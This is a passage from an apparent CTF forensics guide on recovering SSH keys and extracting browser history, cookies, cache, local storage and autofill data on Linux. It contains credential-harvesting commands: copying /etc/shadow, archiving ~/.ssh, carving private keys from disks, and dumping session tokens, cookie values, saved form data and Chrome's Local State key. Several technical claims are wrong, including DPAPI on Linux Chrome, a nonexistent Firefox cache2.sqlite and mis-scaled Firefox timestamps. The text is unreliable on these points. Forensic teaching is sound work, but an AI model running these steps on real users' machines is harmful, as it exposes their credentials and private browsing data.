### SSH Key Recovery and Timeline

**Recover deleted SSH keys:**

```bash
# SSH keys stored in standard locations; deleted keys can be recovered via file recovery
extundelete --restore-all /dev/sdX1 --output-dir /tmp/recovered

# Search unallocated space for SSH key patterns
strings /dev/sdX1 | grep -E "^-----BEGIN.*PRIVATE KEY-----$" | head -10

# SSH keys often have identifying markers; carve from raw disk
dd if=/dev/sdX1 | strings | grep -B5 -A5 "BEGIN.*PRIVATE"
```

**Establish SSH key usage timeline:**

```bash
# Combine SSH logs with key modification times for comprehensive timeline
python3 << 'EOF'
import os
import subprocess
from datetime import datetime

# Get key modification time
key_file = os.path.expanduser('~/.ssh/id_rsa')
key_mtime = os.path.getmtime(key_file)
key_time = datetime.fromtimestamp(key_mtime)

print(f"SSH Key modified: {key_time}")

# Grep for this key's usage in auth.log
key_fingerprint = subprocess.check_output(
    ['ssh-keygen', '-l', '-f', key_file + '.pub'],
    text=True
).split()[1]

print(f"Key fingerprint: {key_fingerprint}")

# Find first and last usage
with open('/var/log/auth.log', 'r') as f:
    lines = f.readlines()
    first_use = None
    last_use = None
    
    for line in lines:
        if 'Accepted publickey' in line and 'ssh-rsa' in line:
            # Basic pattern; actual matching would require more sophisticated parsing
            if not first_use:
                first_use = line
            last_use = line
    
    if first_use:
        print(f"First use: {first_use.strip()}")
    if last_use:
        print(f"Last use: {last_use.strip()}")
EOF
```

### SSH Tunneling and Lateral Movement Detection

**Identify SSH tunnels for C2 communication:**

```bash
# Active SSH tunnels
netstat -tlnp | grep ssh

# SSH port forwarding in use
ss -tlnp | grep sshd

# Look for reverse SSH shells (attacker connects back through SSH)
# These appear as outbound SSH connections from compromised host
grep "ssh" /var/log/auth.log | grep -E "CLIENT|CONNECTED"

# Tunnel setup in SSH logs
grep -i "tunnel" /var/log/auth.log
```

**Detect SSH for lateral movement:**

```bash
# SSH keys accessed by non-SSH processes (potential extraction/theft)
# Requires auditd tracking of SSH key files
ausearch -f /home/user/.ssh/id_rsa | grep -E "open|read"

# Identify unusual SSH connection patterns (spike in connections)
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3}' | uniq -c | sort -rn | head -10

# SSH connections to unusual IPs or ports (lateral movement)
grep "Accepted" /var/log/auth.log | grep -v "192.168.1\|10\.0\.0\|127\.0\.0\.1"
```

---

## CTF Workflow: Comprehensive Linux Forensics Analysis

**Recommended analysis sequence for CTF scenarios:**

1. **Acquire memory and disk images** (preserve original evidence)
2. **Analyze system logs** (/var/log/syslog, /var/log/auth.log) to establish baseline timeline
3. **Examine user accounts** (/etc/passwd, /etc/shadow) for privileged accounts or hidden users
4. **Review bash history** for user commands and executed scripts
5. **Analyze cron jobs** for scheduled persistence mechanisms
6. **Inspect SSH configuration and keys** for backdoors or lateral movement setup
7. **Check package management logs** for suspicious installations
8. **Run process accounting analysis** for comprehensive command execution history
9. **Examine service configuration** for malware persistence through system services
10. **Correlate findings** across multiple log sources for comprehensive incident timeline

**Evidence preservation best practices:**

```bash
# Create forensic copy of critical files before analysis
cp /var/log/auth.log /tmp/auth.log.evidence
cp /etc/passwd /tmp/passwd.evidence
cp /etc/shadow /tmp/shadow.evidence
tar -czf /tmp/forensic_evidence.tar.gz ~/.bash_history ~/.ssh/ /var/spool/cron/ 2>/dev/null

# Calculate hashes for chain of custody
sha256sum /tmp/forensic_evidence.tar.gz > /tmp/evidence.sha256

# Document analysis timeline
echo "Analysis started: $(date)" >> /tmp/analysis_log.txt
```

---

# Web and Browser Forensics

## Browser History Databases (SQLite)

Browser history is stored in SQLite databases, providing timestamped records of visited URLs. SQLite's structure preserves deleted entries in unallocated database space, enabling recovery of cleared browsing history.

### SQLite Database Structure and Browser History Locations

**Locate browser history databases:**

```bash
# Chrome/Chromium history
~/.config/google-chrome/Default/History
~/.config/chromium/Default/History
~/AppData/Local/Google/Chrome/User Data/Default/History  # Windows

# Firefox history
~/.mozilla/firefox/profile.default/places.sqlite
~/.mozilla/firefox/profile.default/places.sqlite-wal  # Write-Ahead Log

# Safari history (macOS)
~/Library/Safari/History.db

# Edge (Chromium-based)
~/AppData/Local/Microsoft/Edge/User Data/Default/History  # Windows
~/.config/microsoft-edge-dev/Default/History  # Linux

# Find all browser databases on system
find ~/ -name "History" -o -name "places.sqlite" 2>/dev/null
```

### Chrome/Chromium History Analysis

**Query Chrome history database:**

```bash
# Open database with sqlite3
sqlite3 ~/.config/google-chrome/Default/History

# List all tables
.tables
# Output: download_url_chains downloads meta typed_url_sync_metadata urls visits

# Examine URL table structure
.schema urls
# Fields: id, url, title, visit_count, typed_count, last_visit_time, hidden, favicon_id

# Query all visited URLs
SELECT url, title, visit_count, last_visit_time FROM urls LIMIT 20;

# Convert Chrome timestamps (microseconds since epoch 1601-01-01)
# Chrome uses Windows FILETIME (100-nanosecond intervals since 1601)
```

**Convert Chrome timestamps and analyze visit history:**

```bash
# Chrome timestamp conversion script
python3 << 'EOF'
import sqlite3
from datetime import datetime, timedelta

chrome_db = '/home/user/.config/google-chrome/Default/History'

def chrome_timestamp_to_datetime(timestamp):
    # Chrome stores time as microseconds since Jan 1, 1601 (Windows epoch)
    # Convert to Unix epoch (Jan 1, 1970)
    epoch_diff = 11644473600  # Seconds between 1601 and 1970
    unix_timestamp = (timestamp / 1000000) - epoch_diff
    return datetime.utcfromtimestamp(unix_timestamp)

try:
    conn = sqlite3.connect(chrome_db)
    cursor = conn.cursor()
    
    # Query URLs with timestamps
    cursor.execute('''
        SELECT url, title, visit_count, last_visit_time 
        FROM urls 
        ORDER BY last_visit_time DESC 
        LIMIT 50
    ''')
    
    for row in cursor.fetchall():
        url, title, visit_count, timestamp = row
        dt = chrome_timestamp_to_datetime(timestamp)
        print(f"{dt} | {url} | Title: {title} | Visits: {visit_count}")
    
    conn.close()
except Exception as e:
    print(f"Error: {e}")
EOF
```

**Extract visit frequency and timeline:**

```bash
# Most visited sites
sqlite3 ~/.config/google-chrome/Default/History << 'EOF'
.mode column
.header on
SELECT url, title, visit_count 
FROM urls 
WHERE visit_count > 10 
ORDER BY visit_count DESC 
LIMIT 20;
EOF

# Visit timeline (reconstruct browser session)
# visits table contains individual visit records
sqlite3 ~/.config/google-chrome/Default/History << 'EOF'
.mode column
.header on
SELECT 
    u.url,
    u.title,
    COUNT(*) as visit_count,
    MAX(v.visit_time) as last_visit
FROM urls u
JOIN visits v ON u.id = v.url
GROUP BY u.url
ORDER BY last_visit DESC
LIMIT 30;
EOF
```

### Firefox History Analysis

**Query Firefox places.sqlite:**

```bash
# Firefox uses Unix timestamps (seconds since epoch)
sqlite3 ~/.mozilla/firefox/profile.default/places.sqlite

# List tables
.tables
# Output: moz_anno_attributes moz_annotations moz_bookmarks 
#         moz_bookmarks_deleted moz_favicons moz_historyvisits 
#         moz_inputhistory moz_items_annos moz_keywords moz_places

# Examine moz_places table (main history)
.schema moz_places
# Fields: id, url, title, rev_host, visit_count, hidden, typed, favicon_id, frecency, last_visit_date, guid

# Query all visited URLs
SELECT url, title, visit_count, last_visit_date FROM moz_places LIMIT 30;

# Firefox stores timestamps as microseconds since epoch (Unix time)
```

**Convert Firefox timestamps and analyze:**

```bash
python3 << 'EOF'
import sqlite3
from datetime import datetime

firefox_db = '/home/user/.mozilla/firefox/profile.default/places.sqlite'

def firefox_timestamp_to_datetime(timestamp_microseconds):
    # Firefox stores time as microseconds since Unix epoch
    unix_timestamp = timestamp_microseconds / 1000000
    return datetime.utcfromtimestamp(unix_timestamp)

try:
    conn = sqlite3.connect(firefox_db)
    cursor = conn.cursor()
    
    # Query Firefox history with timestamps
    cursor.execute('''
        SELECT url, title, visit_count, last_visit_date 
        FROM moz_places 
        WHERE visit_count > 0
        ORDER BY last_visit_date DESC 
        LIMIT 50
    ''')
    
    for row in cursor.fetchall():
        url, title, visit_count, timestamp = row
        if timestamp:
            dt = firefox_timestamp_to_datetime(timestamp)
            print(f"{dt} | {url} | Title: {title} | Visits: {visit_count}")
    
    conn.close()
except Exception as e:
    print(f"Error: {e}")
EOF
```

### SQLite Database Recovery from Deleted Entries

**Recover deleted history from free space:**

```bash
# SQLite databases contain deleted records in unallocated space within the file
# These records persist until database VACUUM operation compacts the file

# Extract raw database file
cp ~/.config/google-chrome/Default/History /tmp/History_copy

# Examine database size and structure
ls -lh /tmp/History_copy
sqlite3 /tmp/History_copy ".databases"

# Query deleted URLs from free space
# [Inference] Tools like DB Browser for SQLite or custom scripts can carve deleted entries

python3 << 'EOF'
import re

# Read database file as binary
with open('/tmp/History_copy', 'rb') as f:
    db_content = f.read()

# SQLite stores URLs as text; search for common URL patterns in free space
urls_found = re.findall(b'(https?://[^\x00]{4,200})', db_content)

print("Potentially recovered URLs from free space:")
for url in urls_found[:20]:
    try:
        print(url.decode('utf-8', errors='ignore'))
    except:
        pass
EOF

# [Unverified] Specialized tools like Undark can extract deleted SQLite records
# undark --input /tmp/History_copy --output recovered_urls.txt
```

**Timeline analysis of deleted history:**

```bash
# Identify when history was last modified
stat ~/.config/google-chrome/Default/History

# If history was cleared, the modification time may differ from last actual visit
# Compare last_visit_time in database with file modification time
python3 << 'EOF'
import sqlite3
import os
from datetime import datetime

history_file = '/home/user/.config/google-chrome/Default/History'
file_mtime = os.path.getmtime(history_file)
file_mtime_dt = datetime.fromtimestamp(file_mtime)

conn = sqlite3.connect(history_file)
cursor = conn.cursor()
cursor.execute('SELECT MAX(last_visit_time) FROM urls')
last_db_visit = cursor.fetchone()[0]

def chrome_timestamp_to_datetime(timestamp):
    epoch_diff = 11644473600
    unix_timestamp = (timestamp / 1000000) - epoch_diff
    return datetime.utcfromtimestamp(unix_timestamp)

last_visit_dt = chrome_timestamp_to_datetime(last_db_visit) if last_db_visit else None

print(f"File last modified: {file_mtime_dt}")
print(f"Last database visit: {last_visit_dt}")
print(f"Time difference: {file_mtime_dt - (last_visit_dt if last_visit_dt else file_mtime_dt)} seconds")

if (file_mtime_dt - (last_visit_dt if last_visit_dt else file_mtime_dt)).total_seconds() > 3600:
    print("History likely cleared after last visit")

conn.close()
EOF
```

---

## Cookie Analysis

Cookies store session tokens, authentication credentials, tracking identifiers, and user preferences. Cookie databases reveal website interactions and can expose sensitive data or authentication mechanisms.

### Cookie Database Locations and Formats

**Locate cookie files:**

```bash
# Chrome cookies (SQLite database)
~/.config/google-chrome/Default/Cookies
~/.config/google-chrome/Default/Cookies-wal

# Firefox cookies (SQLite database)
~/.mozilla/firefox/profile.default/cookies.sqlite
~/.mozilla/firefox/profile.default/cookies.sqlite-wal

# Safari cookies (binary plist format on macOS)
~/Library/Cookies/Cookies.binarycookies

# Find all cookie files
find ~/ -name "Cookies*" -o -name "cookies*" 2>/dev/null
```

### Chrome Cookie Extraction and Decryption

**Query Chrome cookies database:**

```bash
# Chrome cookies are encrypted on Linux (using system keyring)
# [Unverified] Decryption requires access to system keyring or user password

# Query encrypted cookies without decryption
sqlite3 ~/.config/google-chrome/Default/Cookies

.schema cookies
# Fields: creation_utc, host_key, name, value (encrypted), path, expires_utc, 
#         secure, httponly, samesite, last_access_utc, has_expires, persistent, priority

# List cookies (encrypted values shown as binary)
SELECT host_key, name, creation_utc FROM cookies LIMIT 20;
```

**Decrypt Chrome cookies (Linux with system keyring access):**

```bash
# [Inference] Requires system keyring access and user session context
# This technique works when user is logged in or keyring is unlocked

python3 << 'EOF'
import sqlite3
import json
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import subprocess

def decrypt_chrome_cookies(cookies_db_path):
    # Get encryption key from system keyring
    try:
        # On Linux, Chrome uses DPAPI equivalent stored in keyring
        # Requires user session context
        
        # Alternative: Extract key from Chrome's Local State file
        local_state_path = os.path.expanduser('~/.config/google-chrome/Default/Local State')
        with open(local_state_path, 'r') as f:
            local_state = json.load(f)
            encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
            
            if encrypted_key:
                # Key is base64-encoded and encrypted with DPAPI
                # [Unverified] Full decryption requires DPAPI access or running Chrome binary
                print("Encrypted key found in Local State")
                print(f"Key (base64): {encrypted_key[:50]}...")
    except Exception as e:
        print(f"Could not extract encryption key: {e}")
    
    # Query database (values will be encrypted binary)
    conn = sqlite3.connect(cookies_db_path)
    cursor = conn.cursor()
    
    cursor.execute('SELECT host_key, name, value, creation_utc FROM cookies LIMIT 10')
    
    for row in cursor.fetchall():
        host, name, value, creation_time = row
        print(f"Host: {host} | Name: {name}")
        print(f"  Value (encrypted, {len(value)} bytes): {value[:50]}")
        print()

decrypt_chrome_cookies(os.path.expanduser('~/.config/google-chrome/Default/Cookies'))
EOF
```

### Firefox Cookie Extraction

**Query Firefox cookies database:**

```bash
sqlite3 ~/.mozilla/firefox/profile.default/cookies.sqlite

.schema moz_cookies
# Fields: id, baseDomain, originAttributes, name, value, host, path, expiry, 
#         lastAccessed, creationTime, isSecure, isHttpOnly, inBrowserElement, sameSite

# Query all cookies
SELECT host, name, value, expiry, creationTime FROM moz_cookies;

# Convert Firefox timestamp (milliseconds since epoch)
SELECT 
    host,
    name,
    value,
    datetime(creationTime / 1000, 'unixepoch') as created,
    datetime(expiry, 'unixepoch') as expires
FROM moz_cookies
WHERE host LIKE '%.example.com%';
```

**Analyze Firefox cookies for sensitive data:**

```bash
python3 << 'EOF'
import sqlite3
from datetime import datetime

firefox_db = '/home/user/.mozilla/firefox/profile.default/cookies.sqlite'

conn = sqlite3.connect(firefox_db)
cursor = conn.cursor()

# Query cookies with expiry and creation time
cursor.execute('''
    SELECT host, name, value, creationTime, expiry, isSecure, isHttpOnly
    FROM moz_cookies
    ORDER BY creationTime DESC
    LIMIT 50
''')

print("Firefox Cookies Analysis:")
print("=" * 80)

for row in cursor.fetchall():
    host, name, value, creation_ms, expiry, is_secure, is_httponly = row
    
    creation_dt = datetime.utcfromtimestamp(creation_ms / 1000)
    expiry_dt = datetime.utcfromtimestamp(expiry) if expiry else None
    
    secure_flag = "Secure" if is_secure else "Not Secure"
    httponly_flag = "HttpOnly" if is_httponly else "JavaScript Accessible"
    
    print(f"Host: {host}")
    print(f"  Name: {name}")
    print(f"  Value: {value[:100]}..." if len(value) > 100 else f"  Value: {value}")
    print(f"  Created: {creation_dt}")
    print(f"  Expires: {expiry_dt if expiry_dt else 'Session cookie'}")
    print(f"  Flags: {secure_flag}, {httponly_flag}")
    print()

conn.close()
EOF
```

### Cookie Security Analysis

**Identify high-risk cookies:**

```bash
# Look for cookies without secure flag (transmitted over HTTP)
sqlite3 ~/.mozilla/firefox/profile.default/cookies.sqlite << 'EOF'
SELECT host, name, value 
FROM moz_cookies 
WHERE isSecure = 0 
AND host LIKE '%.%' 
LIMIT 20;
EOF

# Identify cookies accessible to JavaScript (not HttpOnly)
sqlite3 ~/.mozilla/firefox/profile.default/cookies.sqlite << 'EOF'
SELECT host, name 
FROM moz_cookies 
WHERE isHttpOnly = 0 
AND isSecure = 0;
EOF

# Long-lived cookies (potential for session hijacking)
sqlite3 ~/.mozilla/firefox/profile.default/cookies.sqlite << 'EOF'
SELECT host, name, expiry, 
       ROUND((expiry - creationTime) / (86400 * 365), 1) as years_valid
FROM moz_cookies 
WHERE expiry > 0
ORDER BY (expiry - creationTime) DESC 
LIMIT 20;
EOF
```

### Authentication Token Extraction

**Identify session and authentication cookies:**

```bash
# Search for common authentication cookie names
python3 << 'EOF'
import sqlite3

firefox_db = '/home/user/.mozilla/firefox/profile.default/cookies.sqlite'

# Common authentication cookie patterns
auth_patterns = [
    'session', 'auth', 'token', 'jwt', 'bearer', 'refresh',
    'sid', 'jsessionid', 'phpsessid', 'aspsessionid', 'cfid'
]

conn = sqlite3.connect(firefox_db)
cursor = conn.cursor()

print("Potential Authentication Cookies:")
print("=" * 80)

for pattern in auth_patterns:
    cursor.execute('''
        SELECT host, name, value, expiry
        FROM moz_cookies
        WHERE name LIKE ?
    ''', (f'%{pattern}%',))
    
    for row in cursor.fetchall():
        host, name, value, expiry = row
        print(f"Host: {host} | Cookie: {name}")
        print(f"  Value: {value[:100]}...")
        print(f"  Expires: {expiry}")
        print()

conn.close()
EOF
```

---

## Cache Extraction

Browser caches store website content (HTML, JavaScript, CSS, images). Cache analysis reveals visited websites, timestamps, and potentially recoverable content without active browsing.

### Browser Cache Locations

**Locate cache directories:**

```bash
# Chrome/Chromium cache
~/.config/google-chrome/Default/Cache/
~/.config/google-chrome/Default/Code Cache/

# Firefox cache
~/.cache/firefox/profile.default/cache2/

# Safari cache (macOS)
~/Library/Caches/Safari/
~/Library/Safari/History Index Files/

# Microsoft Edge
~/.config/microsoft-edge-dev/Default/Code Cache/

# Find all cache directories
find ~/ -type d -name "Cache*" -o -name "cache*" 2>/dev/null
```

### Chrome Cache Analysis

**Examine Chrome cache structure:**

```bash
# Chrome cache uses custom format (not standard file system)
# Cache stored in data_0, data_1, data_2, data_3 files with index_0 and index files

ls -la ~/.config/google-chrome/Default/Cache/

# Extract cache entries with chrome_cache_viewer or similar tools
# [Inference] Custom tools required to parse Chrome's proprietary cache format

python3 << 'EOF'
import os
import struct
import re

cache_dir = os.path.expanduser('~/.config/google-chrome/Default/Cache/')

# Chrome cache index file structure (simplified)
# [Unverified] Full cache parsing requires understanding Chrome's cache format

# Read index_0 file (contains cache metadata)
index_file = os.path.join(cache_dir, 'index_0')
if os.path.exists(index_file):
    with open(index_file, 'rb') as f:
        data = f.read()
        
        # Look for URL patterns in cache data
        urls = re.findall(b'(https?://[^\x00]{10,200})', data)
        
        print("URLs found in Chrome cache:")
        for url in urls[:20]:
            try:
                print(url.decode('utf-8', errors='ignore'))
            except:
                pass
EOF
```

### Firefox Cache Analysis

**Extract Firefox cache entries:**

```bash
# Firefox cache stored in SQLite database (cache2) or directory-based cache

# List cache2 database
sqlite3 ~/.cache/firefox/profile.default/cache2/cache2.sqlite

.tables
# cache table contains cache entries

.schema cache
# Fields: id, hash, hits, size, expire_time, frecency, last_fetched_time, key_prefix

# Query cached URLs and content
SELECT key, hits, size, expire_time FROM cache LIMIT 30;

# Extract specific cached content
SELECT * FROM cache WHERE key LIKE '%example.com%' LIMIT 10;
```

**Carve cached content from disk:**

```bash
# Firefox stores cache as binary files; content can be carved
# Look for file signatures and patterns

python3 << 'EOF'
import os
import re
import magic  # python-magic

cache_dir = os.path.expanduser('~/.cache/firefox/profile.default/cache2')

for root, dirs, files in os.walk(cache_dir):
    for file in files:
        filepath = os.path.join(root, file)
        try:
            # Read file content
            with open(filepath, 'rb') as f:
                content = f.read(1024)  # Read first 1KB
                
                # Identify HTML files
                if b'<!DOCTYPE' in content or b'<html' in content:
                    print(f"HTML file: {filepath}")
                    
                # Look for URLs
                urls = re.findall(b'(https?://[^\x00\x20]{10,200})', content)
                if urls:
                    print(f"URLs in {filepath}:")
                    for url in urls:
                        print(f"  {url.decode('utf-8', errors='ignore')}")
        except Exception as e:
            pass
EOF
```

### Cache Timeline and Frequency Analysis

**Construct browsing timeline from cache:**

```bash
# Cache modification times indicate when content was accessed
find ~/.cache/firefox/profile.default/cache2 -type f -printf '%T@ %Tc %p\n' | sort -rn | head -50

# Identify most frequently cached content
python3 << 'EOF'
import os

cache_dir = os.path.expanduser('~/.cache/firefox/profile.default/cache2')

cache_files = {}
for root, dirs, files in os.walk(cache_dir):
    for file in files:
        filepath = os.path.join(root, file)
        mtime = os.path.getmtime(filepath)
        
        if mtime not in cache_files:
            cache_files[mtime] = []
        cache_files[mtime].append(filepath)

# Sort by modification time (most recent first)
from datetime import datetime

print("Cache access timeline (most recent):")
for timestamp in sorted(cache_files.keys(), reverse=True)[:20]:
    dt = datetime.fromtimestamp(timestamp)
    print(f"{dt}: {len(cache_files[timestamp])} files accessed")
EOF
```

---

## Session Storage Forensics

Session storage (sessionStorage) and persistent storage mechanisms store website data intended to survive browser restarts or persist across sessions. These mechanisms reveal sensitive application data and user interaction patterns.

### Session Storage Locations

**Locate session storage files:**

```bash
# Chrome session storage (LevelDB format)
~/.config/google-chrome/Default/Session Storage/

# Firefox session storage (IndexedDB)
~/.mozilla/firefox/profile.default/storage/default/

# Safari session storage (macOS)
~/Library/Safari/LocalStorage/

# Chromium-based (Edge, Brave)
~/.config/microsoft-edge-dev/Default/Session Storage/
~/.config/BraveSoftware/Brave-Browser/Default/Session Storage/

# Find all session storage locations
find ~/ -type d -name "Session Storage" -o -name "storage" -o -name "IndexedDB" 2>/dev/null
```

### Chrome Session Storage (LevelDB)

**Extract Chrome session storage data:**

```bash
# Chrome session storage uses LevelDB (key-value store)
# [Inference] Requires LevelDB parsing tools or custom extraction

python3 << 'EOF'
import os
import json

session_storage_dir = os.path.expanduser('~/.config/google-chrome/Default/Session Storage/')

# LevelDB files are binary; direct parsing requires LevelDB library
# [Unverified] Tools like ldb or plyvel can read LevelDB databases

# Alternative: Extract as binary and search for patterns
for root, dirs, files in os.walk(session_storage_dir):
    for file in files:
        filepath = os.path.join(root, file)
        
        # Read binary content
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
                
                # Search for JSON-like patterns
                start_idx = 0
                while True:
                    start = content.find(b'{', start_idx)
                    if start == -1:
                        break
                    
                    end = content.find(b'}', start)
                    if end == -1:
                        break
                    
                    try:
                        potential_json = content[start:end+1].decode('utf-8', errors='ignore')
                        parsed = json.loads(potential_json)
                        print(f"JSON found in {file}:")
                        print(json.dumps(parsed, indent=2)[:200])
                    except:
                        pass
                    
                    start_idx = end + 1
        except Exception as e:
            pass
EOF
```

### Firefox IndexedDB Analysis

**Query Firefox IndexedDB storage:**

```bash
# Firefox stores IndexedDB as directory structure with SQLite databases
find ~/.mozilla/firefox/profile.default/storage/default -name "*.sqlite"

# Examine IndexedDB databases
sqlite3 ~/.mozilla/firefox/profile.default/storage/default/*/idb.sqlite

.tables
# Common tables: object_store, object_data, file

# Query stored objects
SELECT * FROM object_data LIMIT 20;
```

**Extract IndexedDB application data:**

```bash
python3 << 'EOF'
import sqlite3
import os
import json

storage_dir = os.path.expanduser('~/.mozilla/firefox/profile.default/storage/default')

for domain_dir in os.listdir(storage_dir):
    domain_path = os.path.join(storage_dir, domain_dir)
    idb_path = os.path.join(domain_path, 'idb.sqlite')
    
    if os.path.exists(idb_path):
        try:
            conn = sqlite3.connect(idb_path)
            cursor = conn.cursor()
            
            # Query stored data
            cursor.execute('SELECT * FROM object_data LIMIT 5')
            rows = cursor.fetchall()
            
            if rows:
                print(f"\nDomain: {domain_dir}")
                for row in rows:
                    print(f"  Data: {row}")
                    
                    # Attempt to parse as JSON
                    try:
                        if len(row) > 1 and isinstance(row[1], bytes):
                            data = json.loads(row[1])
                            print(f"  Parsed: {json.dumps(data, indent=4)[:200]}")
                    except:
                        pass
            
            conn.close()
        except Exception as e:
            pass
EOF
```

---

## Local Storage Examination

Local storage provides persistent key-value data storage accessible to web applications. Local storage persists indefinitely, making it valuable for forensic analysis of user interactions and saved data.

### Local Storage Locations

**Locate local storage files:**

```bash
# Chrome local storage
~/.config/google-chrome/Default/Local Storage/
~/.config/google-chrome/Default/Local Storage/leveldb/

# Firefox local storage
~/.mozilla/firefox/profile.default/storage/default/*/ls/

# Safari local storage (macOS)
~/Library/Safari/LocalStorage/

# Chromium-based browsers
~/.config/microsoft-edge-dev/Default/Local Storage/
~/.config/BraveSoftware/Brave-Browser/Default/Local Storage/

# Find all local storage
find ~/ -path "*Local Storage*" -o -path "*/ls/*" 2>/dev/null
```

### Chrome Local Storage (LevelDB)

**Extract Chrome local storage data:**

```bash
# Chrome local storage uses LevelDB (similar to session storage)
python3 << 'EOF'
import os
import re

local_storage_dir = os.path.expanduser('~/.config/google-chrome/Default/Local Storage/leveldb/')

print("Chrome Local Storage Analysis:")
print("=" * 80)

for file in os.listdir(local_storage_dir):
    filepath = os.path.join(local_storage_dir, file)
    
    if file.endswith('.ldb'):
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
                
                # Search for URLs (domain identifiers)
                urls = re.findall(b'(https?://[^\x00]{5,100})', content)
                if urls:
                    print(f"File: {file}")
                    for url in urls[:5]:
                        print(f"  {url.decode('utf-8', errors='ignore')}")
                
                # Search for JSON objects
                json_matches = re.findall(b'({[^}]{20,500}})', content)
                if json_matches:
                    print(f"  JSON data found ({len(json_matches)} objects)")
                    for match in json_matches[:2]:
                        try:
                            print(f"    {match.decode('utf-8', errors='ignore')[:100]}")
                        except:
                            pass
                print()
        except Exception as e:
            pass
EOF
```

### Firefox Local Storage Analysis

**Query Firefox local storage:**

```bash
# Firefox stores local storage in SQLite files
find ~/.mozilla/firefox/profile.default/storage/default -name "ls.sqlite"

# Examine specific domain storage
sqlite3 ~/.mozilla/firefox/profile.default/storage/default/*/ls.sqlite

.schema
# Typical table: lsdb (contains key, value pairs)

SELECT * FROM lsdb LIMIT 20;

# Query by origin
SELECT key, value FROM lsdb WHERE key LIKE '%flag%' OR value LIKE '%password%';
```

**Extract Firefox local storage for CTF analysis:**

```bash
python3 << 'EOF'
import sqlite3
import os
import json

storage_dir = os.path.expanduser('~/.mozilla/firefox/profile.default/storage/default')

print("Firefox Local Storage Analysis:")
print("=" * 80)

for domain_dir in os.listdir(storage_dir):
    domain_path = os.path.join(storage_dir, domain_dir)
    ls_path = os.path.join(domain_path, 'ls.sqlite')
    
    if os.path.exists(ls_path):
        try:
            conn = sqlite3.connect(ls_path)
            cursor = conn.cursor()
            
            # Query all local storage entries
            cursor.execute('SELECT key, value FROM lsdb')
            rows = cursor.fetchall()
            
            if rows:
                print(f"\nOrigin: {domain_dir}")
                for key, value in rows:
                    print(f"  Key: {key}")
                    print(f"  Value: {value[:100]}..." if len(value) > 100 else f"  Value: {value}")
                    
                    # Attempt JSON parsing
                    try:
                        parsed = json.loads(value)
                        print(f"  Parsed: {json.dumps(parsed, indent=4)[:150]}")
                    except:
                        pass
                    print()
            
            conn.close()
        except Exception as e:
            pass
EOF
```

### Sensitive Data in Local Storage

**Search for flags, credentials, and sensitive data:**

```bash
# Firefox local storage: grep for common sensitive patterns
python3 << 'EOF'
import sqlite3
import os
import re

sensitive_patterns = [
    'flag', 'password', 'api_key', 'token', 'secret', 'key',
    'admin', 'root', 'username', 'credential', 'session', 'auth'
]

storage_dir = os.path.expanduser('~/.mozilla/firefox/profile.default/storage/default')

print("Sensitive Data Search in Firefox Local Storage:")
print("=" * 80)

for domain_dir in os.listdir(storage_dir):
    domain_path = os.path.join(storage_dir, domain_dir)
    ls_path = os.path.join(domain_path, 'ls.sqlite')
    
    if os.path.exists(ls_path):
        try:
            conn = sqlite3.connect(ls_path)
            cursor = conn.cursor()
            
            cursor.execute('SELECT key, value FROM lsdb')
            rows = cursor.fetchall()
            
            for key, value in rows:
                key_lower = key.lower()
                value_lower = value.lower()
                
                # Check if key or value matches sensitive patterns
                for pattern in sensitive_patterns:
                    if pattern in key_lower or pattern in value_lower:
                        print(f"[{domain_dir}]")
                        print(f"  Key: {key}")
                        print(f"  Value: {value}")
                        print()
                        break
            
            conn.close()
        except Exception as e:
            pass
EOF
```

---

## Form Autofill Data

Browser autofill functionality stores previously entered form data (names, addresses, payment information, usernames). This data reveals user identity, frequent forms, and potentially sensitive information.

### Form Autofill Locations

**Locate autofill databases:**

```bash
# Chrome autofill (SQLite)
~/.config/google-chrome/Default/Web Data

# Firefox autofill (JSON files in profile)
~/.mozilla/firefox/profile.default/formhistory.sqlite
~/.mozilla/firefox/profile.default/logins.json

# Safari autofill (binary plist on macOS)
~/Library/Safari/History.db
~/Library/Safari/TopSites.db

# Chromium-based browsers
~/.config/microsoft-edge-dev/Default/Web Data
```

### Chrome Autofill and Payment Information

**Extract Chrome form autofill:**

```bash
# Chrome Web Data database contains autofill information
sqlite3 ~/.config/google-chrome/Default/"Web Data"

.tables
# autofill, autofill_profile, autofill_profile_addresses, etc.

.schema autofill
# Fields: rowid, name, value, value_lower, date_created, date_last_used, count

# Query all autofill entries
SELECT name, value, date_created, date_last_used, count 
FROM autofill 
ORDER BY date_last_used DESC 
LIMIT 30;

# Extract autofill profile information (names, addresses)
SELECT * FROM autofill_profile_names;
SELECT * FROM autofill_profile_addresses;
```

**Decrypt and analyze Chrome autofill data:**

```bash
python3 << 'EOF'
import sqlite3
import os
from datetime import datetime

web_data_path = os.path.expanduser('~/.config/google-chrome/Default/Web Data')

if os.path.exists(web_data_path):
    conn = sqlite3.connect(web_data_path)
    cursor = conn.cursor()
    
    # Query autofill entries
    try:
        cursor.execute('''
            SELECT name, value, date_created, date_last_used, count
            FROM autofill
            ORDER BY date_last_used DESC
            LIMIT 50
        ''')
        
        print("Chrome Form Autofill Data:")
        print("=" * 80)
        
        for row in cursor.fetchall():
            name, value, created, last_used, count = row
            
            # Convert Chrome timestamp (microseconds since epoch 1601)
            if created and created != 0:
                created_dt = datetime.utcfromtimestamp((created / 1000000) - 11644473600)
            else:
                created_dt = None
            
            if last_used and last_used != 0:
                last_used_dt = datetime.utcfromtimestamp((last_used / 1000000) - 11644473600)
            else:
                last_used_dt = None
            
            print(f"Field: {name}")
            print(f"  Value: {value}")
            print(f"  Created: {created_dt}")
            print(f"  Last Used: {last_used_dt}")
            print(f"  Usage Count: {count}")
            print()
    
    except Exception as e:
        print(f"Error: {e}")
    
    conn.close()
EOF
```

### Firefox Form History

**Query Firefox form autofill:**

```bash
sqlite3 ~/.mozilla/firefox/profile.default/formhistory.sqlite

.schema
# Table: moz_formhistory

.schema moz_formhistory
# Fields: id, fieldname, value, timesUsed, firstUsed, lastUsed, guid

# Query form history
SELECT fieldname, value, timesUsed, firstUsed, lastUsed 
FROM moz_formhistory 
ORDER BY lastUsed DESC 
LIMIT 50;

# Filter for potentially sensitive fields
SELECT fieldname, value, timesUsed 
FROM moz_formhistory 
WHERE fieldname LIKE '%password%' 
   OR fieldname LIKE '%card%' 
   OR fieldname LIKE '%ssn%';
```

### Saved Passwords and Credentials

